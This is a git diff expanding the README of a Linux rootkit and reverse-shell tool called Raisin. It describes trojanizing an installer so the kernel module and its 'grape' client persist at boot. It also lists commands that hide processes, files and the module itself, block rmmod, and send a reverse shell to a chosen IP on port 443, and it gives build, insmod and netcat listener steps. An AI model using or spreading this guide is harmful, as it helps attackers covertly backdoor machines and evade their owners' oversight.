@@ -1,23 +1,57 @@
 # Raisin Malware
 
-The raison malware 
+<img src="images/angry_raisin.png" width="200">
 
-## Options 
+The raisin malware is a combination rootkit and reverse shell application. The raisin malware uses the LKM created by [Maxim Biro](https://www.google.com) to gain root access, grape is a continuously running client that will launch a reverse shell and can then be used to send commands to the LKM.
 
-* root              Grants you root shell access.
-* hpid $PID         Hides the specified PID.
-* unpid $PID        Unhides the specified PID.
-* hfile $FILENAME   Hides the specified FILENAME globally. Must be a filename without any path
-* unfile $FILENAME  Unhides the specified FILENAME.
-* hide u             Hides the rootkit LKM.
-* unhide            Unhides the rootkit LKM.
-* protect           Protects the rootkit from rmmod.
-* unprotect         Disables the rmmod protection.
-* reverse $IP       Sends start command to begin reverse shell at IP address, port is 443
+The rootkit only works on **Linux kernels up to 4.4.0-31** and has architecture-specific code in the rootkit which is implemented only for **x86** and **x86-64** architectures. The raisin malware was tested on a Ubuntu 14.04 VM.
 
-## NOTES
+## Infection Method
 
-* For hfile and unfile the path to the file must be from the persecptive of 
-the application where it was started.
+The intention is to inject raisin into another download that requires root
+privileges to install. The installer will be altered to create the kernel module
+and grape client, then add the module to the /etc/modules file, and create a startup file for grape so both automatically run program on Linux startup.
+
+## Commands
+
+| Commands         | Description   |
+| ---------------- |:-------------:|
+| root             | Grants you root shell access. Will happen automatically.|
+| hpid $PID        | Hides the specified PID.|
+| unpid $PID       | Unhides the specified PID.|
+| hfile $FILENAME  | Hides the specified FILENAME globally. Must be a filename without any path|
+| unfile $FILENAME | Unhides the specified FILENAME.|
+| hide             | Hides the rootkit LKM.|
+| unhide           | Unhides the rootkit LKM.|
+| protect          | Protects the rootkit from rmmod.|
+| unprotect        | Disables the rmmod protection.|
+| reverse $IP      | Sends start command to begin reverse shell at IP address, port is 443|
+| touch            | Creates a pipe in /opt. A good test to see if root access is working|
+
+## Instructions
+
+1. Run `make` to create rootkit and grape client. Will need to install build
+essentials if not already installed `apt-get install build-essential`
+2. Load the rootkit using `sudo insmod rootkit.ko`, the rootkit will hide itself so it can't be seen with `lsmod` till the `unhide` command is given.
+3. Open a listener for the reverse shell using `sudo nc -lvp 443`. On the default
+build target IP is set for default VM IP of `10.0.2.15`.
+4. Start the grape client `./grape`
+5. The reverse shell is now active and can be used to send commands to the host
+machine.
+6. In the `/tmp` directory a pipe is created named `grape_fifo`. Sending `echo -n`
+commands to this pipe will allow access to rootkit and other functions.
+
+## Examples Commands
+
+* `echo -n "unhide\0" > grape_fifo`
+* `echo -n "hfile ../test.txt\0" > grape_fifo`
+* `echo -n "reverse 192.168.1.1\0" > grape_fifo`
+
+## Notes
+
+* For **hfile** and **unfile** the path to the file must be from the perspective of the application where it was started.
 * In order to avoid errors with c strings add the '\0' to the end of the line.
-    ex. echo -n "unhide\0" > pipe_name
+    `ex. echo -n "unhide\0" > grape_fifo`
+* grape will automatically close if no internet access is available.
+* Default build reverse shell IP address is set to `10.0.2.15` the default VM
+IP for testing in a VM, port `443`.
